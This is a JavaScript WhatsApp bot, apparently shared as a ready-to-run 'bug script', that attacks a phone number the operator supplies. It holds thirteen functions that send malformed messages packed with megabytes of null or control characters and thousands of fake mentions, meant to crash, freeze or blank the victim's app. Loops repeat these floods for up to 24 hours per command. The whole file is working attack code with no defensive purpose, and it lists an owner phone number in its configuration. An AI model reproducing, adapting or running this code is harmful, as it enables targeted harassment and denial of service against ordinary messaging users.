// ============================================================
// BRAM ULTIMATE — WHATSAPP BUG SCRIPT
// 🔥 5 BUG VARIANTS | PRIVATE BOT | GITHUB VERSION
// 👤 AUTHOR: @Bramz
// ============================================================

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const crypto = require('crypto');

// ============================================================
// KONFIGURASI — GANTI NOMOR OWNER!
// ============================================================
const CONFIG = {
    owner: ['6285379307765@s.whatsapp.net'],
    botName: 'BRAM ULTIMATE',
    prefix: '.'
};

function isOwner(number) { return CONFIG.owner.includes(number); }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ============================================================
// 🔥 BUG FUNCTIONS
// ============================================================

// 1. FORCE NO CLICK
async function ForceNoClick(sock, X) {
    try {
        await sock.relayMessage(X, {
            extendedTextMessage: {
                text: "\n".repeat(9000),
                contextInfo: {
                    participant: X,
                    mentionedJid: [
                        "1351515@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                    ],
                    remoteJid: X,
                    stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000,
                        },
                    },
                },
            },
        }, {
            participant: { jid: X },
        });
        return true;
    } catch (e) { return false; }
}

// 2. DELAY PAYMENT
async function DelayPayment(sock, X) {
    try {
        const payload = {
            sendPaymentMessage: {
                noteMessage: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(200000)
                    }
                },
                amount1000: 50000,
                currency: "IDR",
            }
        };
        const msg = generateWAMessageFromContent(X, payload, {});
        await sock.relayMessage(X, msg.message, { messageId: msg.key.id });
        return true;
    } catch (e) { return false; }
}

// 3. OBSIDIAN COREX DELAY
async function ObsidianCorexDelayBeta(sock, X) {
    try {
        for (let i = 0; i < 10; i++) {
            const msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                participant: X,
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                                ],
                            },
                            body: {
                                text: "@Bramz Here Bro!!",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_message",
                                paramsJson: "\x10".repeat(1000000),
                                version: 2
                            },
                        },
                    },
                },
            }, {
                ephemeralExpiration: 0,
                forwardingScore: 9741,
                isForwarded: true,
                font: Math.floor(Math.random() * 99999999),
                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
            });

            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [X],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: X } }]
                    }]
                }]
            });
            await sleep(250);
        }
        return true;
    } catch (e) { return false; }
}

// 4. VERLOAD HARDCORE
async function VerloadHardCore(sock, X) {
    try {
        for (let j = 0; j < 15; j++) {
            const msg = await generateWAMessageFromContent(X, {
                ephemeralMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32),
                            supportPayload: JSON.stringify({
                                version: 2,
                                ticket_id: crypto.randomBytes(16)
                            })
                        },
                        interactiveMessage: {
                            header: {
                                title: "🩸⃟༑⌁⃰BramzyIsHere.js",
                                hasMediaAttachment: false,
                                audioMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "audio/mpeg",
                                    directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1750124469",
                                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
                                    contextInfo: {
                                        mentionedJid: [X],
                                        participant: X,
                                        remoteJid: X,
                                        expiration: 9741,
                                        ephemeralSettingTimestamp: 9741,
                                        disappearingMode: {
                                            initiator: "INITIATED_BY_OTHER",
                                            trigger: "ACCOUNT_SETTING"
                                        }
                                    },
                                    scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
                                    scanLengths: [1000, 2000, 3000, 4000],
                                    midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
                                }
                            },
                            body: {
                                text: "🩸⃟༑⌁⃰BramzyIsHere.js"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "{".repeat(1000)
                            }
                        }
                    }
                }
            }, {});
            await sleep(200);
        }
        return true;
    } catch (e) { return false; }
}

// 5. STICKER SPLIT
async function StickerSplit(sock, X) {
    try {
        const msg = {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                mimetype: "image/webp",
                height: 9999,
                width: 9999,
                directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                fileLength: 12260,
                mediaKeyTimestamp: "1743832131",
                isAnimated: false,
                stickerSentTs: "X",
                isAvatar: false,
                isAiSticker: false,
                isLottie: false,
                contextInfo: {
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                    ],
                    stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }
            }
        };
        await sock.relayMessage("status@broadcast", msg, {
            statusJidList: [X],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: X } }]
                }]
            }]
        });
        return true;
    } catch (e) { return false; }
}

// 6. FORCE BITTER SPAM
async function ForceBitterSpam(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "💀 BRAM ULTIMATE " + "🔥".repeat(5000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(500000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 7. FORCE COMMUNITY
async function ForceComunity(sock, X) {
    try {
        const msg = {
            interactiveResponseMessage: {
                body: {
                    text: "🔥 BRAM ULTIMATE COMMUNITY " + "\n".repeat(8000),
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: "\u0000".repeat(500000),
                    version: 3
                },
                entryPointConversionSource: "call_permission_message"
            }
        };
        await sock.relayMessage(X, msg, {});
        return true;
    } catch (e) { return false; }
}

// 8. STICK FORCLOSE
async function StickForclose(sock, X) {
    try {
        const msg = {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                mimetype: "image/webp",
                height: 9999,
                width: 9999,
                directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
                fileLength: 12260,
                mediaKeyTimestamp: "1743832131",
                isAnimated: false,
                stickerSentTs: "X",
                isAvatar: false,
                isAiSticker: false,
                isLottie: false,
                contextInfo: {
                    mentionedJid: [
                        "0@s.whatsapp.net",
                        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
                    ],
                    stanzaId: "1234567890ABCDEF",
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        }
                    }
                }
            }
        };
        await sock.relayMessage("status@broadcast", msg, {
            statusJidList: [X],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: X } }]
                }]
            }]
        });
        return true;
    } catch (e) { return false; }
}

// 9. RFP TARSAX
async function RFPTarsax(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "☢️ BRAM ULTIMATE RFP " + "💀".repeat(3000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(700000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 10. CRASH UI
async function CrashUi(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "💥 CRASH UI " + "🔄".repeat(5000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(800000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 11. FCANDROHARD
async function Fcandrohard(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "🤖 FCANDROHARD " + "🔧".repeat(4000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(900000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 12. BLANK PACK
async function BlankPack(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⬜ BLANK PACK " + " ".repeat(10000),
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(600000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// 13. XPROTEX BLANK CHAT V4
async function XProtexBlankChatV4(sock, X) {
    try {
        const msg = await generateWAMessageFromContent(X, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "🛡️ XPROTEX BLANK " + "⬜".repeat(3000),
                            format: "DEFAULT"
          },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(500000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_message"
                    }
                }
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 999999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        await sock.relayMessage(X, msg.message, {});
        return true;
    } catch (e) { return false; }
}

// ============================================================
// 📋 COMBINED BUG FUNCTIONS
// ============================================================

async function Crashandroid(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ Crashandroid Selesai!');
            return;
        }
        try {
            if (count < 50) {
                await Promise.all([
                    ForceNoClick(sock, X), ForceNoClick(sock, X), ForceNoClick(sock, X),
                    ForceNoClick(sock, X), ForceNoClick(sock, X), ForceNoClick(sock, X),
                    ForceNoClick(sock, X), ForceNoClick(sock, X), ForceNoClick(sock, X),
                    await sleep(1000)
                ]);
                console.log('🔥 Crashandroid ' + (count+1) + '/50');
                count++;
                setTimeout(sendNext, 4000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function DelayBapakLo(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ DelayBapakLo Selesai!');
            return;
        }
        try {
            if (count < 50) {
                await Promise.all([
                    DelayPayment(sock, X),
                    ObsidianCorexDelayBeta(sock, X),
                    ObsidianCorexDelayBeta(sock, X),
                    DelayPayment(sock, X),
                    ObsidianCorexDelayBeta(sock, X),
                    await sleep(4000)
                ]);
                console.log('🟡 DelayBapakLo ' + (count+1) + '/50');
                count++;
                setTimeout(sendNext, 90000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function Forclose(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ Forclose Selesai!');
            return;
        }
        try {
            if (count < 50) {
                await Promise.all([
                    StickerSplit(sock, X), StickerSplit(sock, X), StickerSplit(sock, X),
                    StickerSplit(sock, X), StickerSplit(sock, X),
                    await sleep(3000),
                    ForceBitterSpam(sock, X),
                    StickerSplit(sock, X),
                    ForceBitterSpam(sock, X), ForceBitterSpam(sock, X), ForceBitterSpam(sock, X),
                    await sleep(9000),
                    StickForclose(sock, X), StickForclose(sock, X), StickForclose(sock, X),
                    ForceComunity(sock, X), ForceComunity(sock, X),
                    await sleep(3000),
                    RFPTarsax(sock, X), RFPTarsax(sock, X), RFPTarsax(sock, X),
                    ForceComunity(sock, X), ForceComunity(sock, X),
                    await sleep(5600)
                ]);
                console.log('💥 Forclose ' + (count+1) + '/50');
                count++;
                setTimeout(sendNext, 2000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function StuckHome(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ StuckHome Selesai!');
            return;
        }
        try {
            if (count < 200) {
                await Promise.all([
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    await sleep(4000),
                    BlankPack(sock, X), BlankPack(sock, X), BlankPack(sock, X),
                    CrashUi(sock, X), CrashUi(sock, X), CrashUi(sock, X),
                    Fcandrohard(sock, X),
                    await sleep(3000),
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    XProtexBlankChatV4(sock, X), XProtexBlankChatV4(sock, X),
                    await sleep(4000),
                    BlankPack(sock, X), BlankPack(sock, X), BlankPack(sock, X),
                    CrashUi(sock, X), CrashUi(sock, X), CrashUi(sock, X),
                ]);
                console.log('☢️ StuckHome ' + (count+1) + '/200');
                count++;
                setTimeout(sendNext, 3000);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

async function BomBug(sock, durationHours, X) {
    const totalDurationMs = durationHours * 3600000;
    const startTime = Date.now();
    let count = 0, batch = 1, maxBatches = 5;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
            console.log('✅ BomBug Selesai!');
            return;
        }
        try {
            if (count < 200) {
                await Promise.all([
                    VerloadHardCore(sock, X),
                    await sleep(5000)
                ]);
                console.log('💣 BomBug ' + (count+1) + '/200');
                count++;
                setTimeout(sendNext, 700);
            } else {
                count = 0; batch++;
                setTimeout(sendNext, 300000);
            }
        } catch (error) { setTimeout(sendNext, 700); }
    };
    sendNext();
}

// ============================================================
// 📋 MESSAGE HANDLER
// ============================================================
async function handleMessage(sock, msg, sender, isGroup) {
    try {
        const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
        if (!text) return;
        const cmd = text.toLowerCase().trim();
        const prefix = CONFIG.prefix;
        
        if (!isOwner(sender)) {
            await sock.sendMessage(sender, { text: '❌ *AKSES DITOLAK!*\nHanya owner yang bisa pakai.' });
            return;
        }
        
        if (cmd === prefix + 'menu' || cmd === prefix + 'help') {
            await sock.sendMessage(sender, {
                text: '💀 *BRAM ULTIMATE*\n👤 @Bramz\n\n📋 *🔥 BUG VARIANTS:*\n\n' + prefix + 'crash [nomor] — Crash Android\n' + prefix + 'delay [nomor] — Delay Bapak Lo\n' + prefix + 'forclose [nomor] — Forclose\n' + prefix + 'stuck [nomor] — Stuck Home\n' + prefix + 'bomb [nomor] — Bom Bug\n\n📡 *UTILITY:*\n' + prefix + 'ping — Cek koneksi\n' + prefix + 'status — Cek status'
            });
            return;
        }
        
        if (cmd === prefix + 'ping') {
            await sock.sendMessage(sender, { text: '🏓 *PONG!*' });
            return;
        }
        
        if (cmd === prefix + 'status') {
            await sock.sendMessage(sender, { text: '✅ *ONLINE*\n👑 Owner: ' + CONFIG.owner.join(', ') });
            return;
        }
        
        // BUG COMMANDS
        const bugCommands = {
            'crash': Crashandroid,
            'delay': DelayBapakLo,
            'forclose': Forclose,
            'stuck': StuckHome,
            'bomb': BomBug
        };
        
        for (const [key, func] of Object.entries(bugCommands)) {
            if (cmd.startsWith(prefix + key + ' ')) {
                const target = cmd.replace(prefix + key + ' ', '').trim();
                if (!target || target.length < 10) {
                    await sock.sendMessage(sender, { text: '❌ Format: .' + key + ' 6281234567890' });
                    return;
                }
                let targetJid = target.includes('@') ? target : target + '@s.whatsapp.net';
                await sock.sendMessage(sender, { text: '☢️ *' + key.toUpperCase() + '* to ' + target });
                setTimeout(async () => await func(sock, 24, targetJid), 100);
                return;
            }
        }
        
        if (!isGroup) {
            await sock.sendMessage(sender, { text: '🤖 Bot aktif! Ketik .menu' });
        }
    } catch (e) { console.error(e.message); }
}

// ============================================================
// START BOT
// ============================================================
let sock = null, isConnected = false, reconnectAttempts = 0;

async function startBot() {
    console.log('🔥 BRAM ULTIMATE STARTING...');
    try {
        if (!fs.existsSync('./auth')) fs.mkdirSync('./auth', { recursive: true });
        const { state, saveCreds } = await useMultiFileAuthState('auth');
        sock = makeWASocket({
            auth: state,
            printQRInTerminal: true,
            browser: ['BRAM ULTIMATE', 'Chrome', '13.0'],
            logger: pino({ level: 'silent' })
        });
        sock.ev.on('creds.update', saveCreds);
        sock.ev.on('connection.update', ({ connection, qr }) => {
            if (qr) { console.log('📱 SCAN QR CODE:'); console.log(qr); }
            if (connection === 'open') {
                isConnected = true;
                console.log('✅ BOT CONNECTED!');
                console.log('💀 BRAM ULTIMATE ACTIVE');
                console.log('📋 Ketik .menu di WhatsApp');
            }
        });
        sock.ev.on('messages.upsert', async ({ messages }) => {
            try {
                const msg = messages[0];
                if (!msg.message || msg.key.fromMe || !msg.key.remoteJid) return;
                const sender = msg.key.remoteJid;
                const isGroup = sender.includes('@g.us');
                const senderJid = isGroup ? msg.key.participant : sender;
                if (senderJid) await handleMessage(sock, msg, senderJid, isGroup);
            } catch (e) {}
        });
        return sock;
    } catch (e) { console.error('Error:', e.message); setTimeout(startBot, 10000); return null; }
}
startBot();
